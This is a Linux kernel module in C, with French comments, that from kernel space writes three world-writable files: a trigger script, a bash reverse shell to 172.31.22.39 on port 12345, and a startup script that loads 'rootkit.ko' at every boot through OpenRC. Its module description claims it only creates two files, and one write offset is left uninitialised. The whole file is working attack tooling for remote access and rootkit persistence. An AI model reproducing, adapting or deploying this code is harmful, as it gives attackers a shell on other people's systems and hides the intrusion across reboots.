#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Votre Nom");
MODULE_DESCRIPTION("LKM pour créer et écrire dans deux fichiers.");
MODULE_VERSION("1.0");

static int __init lkm_file_create_init(void) {
    struct file *trigger_file, *revshell_file, *persistence_file;
    loff_t pos_trigger = 0, pos_revshell = 0, pos_persistence;
    char *trigger_content = "#!/bin/bash\n";
    char *revshell_content = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.31.22.39/12345 0>&1\n";
    char *persistence_content =
        "echo \"#!/bin/sh\" > /etc/local.d/my_startup.start\n"
        "echo \"insmod /111111111111111111111111111/rootkit.ko\" >> /etc/local.d/my_startup.start\n"
        "chmod +x /etc/local.d/my_startup.start\n"
        "rc-update add local default\n";
    ssize_t written;

    printk(KERN_INFO "LKM: Initialisation du module.\n");

    // Crée et ouvre le premier fichier
    trigger_file = filp_open("/111111111111111111111111111/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(trigger_file)) {
        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/trigger.\n");
        return PTR_ERR(trigger_file);
    }

    // Écrit dans le premier fichier
    written = kernel_write(trigger_file, trigger_content, strlen(trigger_content), &pos_trigger);
    if (written < 0) {
        printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/trigger.\n");
        filp_close(trigger_file, NULL);
        return written;
    }
    printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/trigger.\n");
    filp_close(trigger_file, NULL);

    // Crée et ouvre le second fichier
    revshell_file = filp_open("/111111111111111111111111111/revshell.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(revshell_file)) {
        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/revshell.sh.\n");
        return PTR_ERR(revshell_file);
    }

    // Écrit dans le second fichier
    written = kernel_write(revshell_file, revshell_content, strlen(revshell_content), &pos_revshell);
    if (written < 0) {
        printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/revshell.sh.\n");
        filp_close(revshell_file, NULL);
        return written;
    }
    printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/revshell.sh.\n");
    filp_close(revshell_file, NULL);

    // Créer et écrire dans le fichier persistence
    persistence_file = filp_open("/111111111111111111111111111/persistence.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(persistence_file)) {
        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/persistence.sh.\n");
        return PTR_ERR(persistence_file);
    }
    written = kernel_write(persistence_file, persistence_content, strlen(persistence_content), &pos_persistence);
    if (written < 0) {
        printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/persistence.sh.\n");
        filp_close(persistence_file, NULL);
        return written;
    }
    printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/persistence.sh.\n");
    filp_close(persistence_file, NULL);

    return 0;
}

static void __exit lkm_file_create_exit(void) {
    printk(KERN_INFO "LKM: Module retiré.\n");
}

module_init(lkm_file_create_init);
module_exit(lkm_file_create_exit);